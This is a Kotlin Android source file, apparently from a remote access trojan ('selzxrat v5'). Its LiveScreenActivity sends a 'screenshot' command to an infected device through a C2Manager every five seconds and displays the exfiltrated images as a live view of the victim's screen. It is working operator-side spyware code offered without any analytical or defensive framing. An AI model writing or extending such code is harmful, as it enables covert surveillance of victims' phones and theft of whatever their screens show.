package com.selzxrat.v5.ui

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ImageView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.bumptech.glide.Glide
import com.selzxrat.v5.C2Manager
import com.selzxrat.v5.R

class LiveScreenActivity : AppCompatActivity() {

    private lateinit var ivScreen: ImageView
    private val handler = Handler(Looper.getMainLooper())
    private var isRunning = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_live_screen)

        supportActionBar?.title = "Live Screen"
        supportActionBar?.setDisplayHomeAsUpEnabled(true)

        ivScreen = findViewById(R.id.ivLiveScreen)

        val deviceId = intent.getStringExtra("device_id") ?: return

        Toast.makeText(this, "Requesting screenshot from $deviceId", Toast.LENGTH_SHORT).show()

        // Poll for screenshots
        isRunning = true
        val runnable = object : Runnable {
            override fun run() {
                if (!isRunning) return
                C2Manager.sendCommand(deviceId, "screenshot", "")
                handler.postDelayed(this, 5000)
            }
        }
        handler.postDelayed(runnable, 1000)

        C2Manager.onExfilReceived { data ->
            if (data.type == "screenshot" && data.deviceId == deviceId) {
                runOnUiThread {
                    try {
                        Glide.with(this@LiveScreenActivity)
                            .load(data.content)
                            .into(ivScreen)
                    } catch (e: Exception) {}
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        handler.removeCallbacksAndMessages(null)
    }

    override fun onSupportNavigateUp(): Boolean {
        finish()
        return true
    }
}